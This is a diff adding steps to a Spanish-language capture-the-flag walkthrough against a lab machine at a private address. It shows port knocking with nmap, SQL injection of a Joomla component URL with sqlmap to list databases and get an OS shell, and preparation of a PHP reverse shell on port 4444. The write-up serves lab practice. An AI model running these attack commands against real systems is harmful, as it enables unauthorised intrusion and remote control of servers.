@@ -83,7 +83,7 @@ Decodificar cadena binaria: https://www.traductorbinario.com/
 
 ![12](https://user-images.githubusercontent.com/75953873/182727491-9cdcf046-d840-4923-a7fd-1c5d0258a98c.png)
 
-- *Paso 6:* Acceder al puerto 666 golpeado recursivamente los puertos `1001,1101,1011,1001` con Nmap. }
+- *Paso 6:* Acceder al puerto 666 golpeado recursivamente los puertos `1001,1101,1011,1001` con Nmap. 
 ```
 nmap -r -p 1001,1101,1011,1001 192.168.25.131
 ```
@@ -92,3 +92,29 @@ nmap -r -p 1001,1101,1011,1001 192.168.25.131
 URL con el puerto 666 abuerto: `http://192.168.25.131:666`
 
 ![14](https://user-images.githubusercontent.com/75953873/182728213-b629fc94-5457-4086-b57d-f5b01b3aeb2a.png)
+
+- *Paso 7:* Encontrar parámetro vulnerable a inyección SQLI. 
+
+Navegando en el sitio web se puede observar que la "Lista de artículos de contenido" presenta una URL crítica.
+```
+sqlmap --url 'http://192.168.25.131:666/index.php?option=com_abc&view=abc&letter=List+of+content+items...&Itemid=3' --dbs --batch
+```
+![15](https://user-images.githubusercontent.com/75953873/182728721-92cf4596-2d56-4614-88c3-30419f27d7d7.png)
+
+Subir una shell a la base de datos `joomla`:
+```
+sqlmap --url 'http://192.168.25.131:666/index.php?option=com_abc&view=abc&letter=List+of+content+items...&Itemid=3' -D joomla --os-shell --batch
+```
+![16](https://user-images.githubusercontent.com/75953873/182729464-41340377-450f-45ff-94eb-4c9789aab291.png)
+
+Editar la reverse shell PHP y subirla al servidor local:
+```
+cp /usr/share/webshells/php/php-reverse-shell.php .
+nano php-reverse-shell.php
+```
+
+**$ip:** La IP local de su máquina.
+
+**$port:** 4444 (opcional).
+
+![17](https://user-images.githubusercontent.com/75953873/182729943-7059e627-8c01-43bc-b0f6-572664c2773c.png)
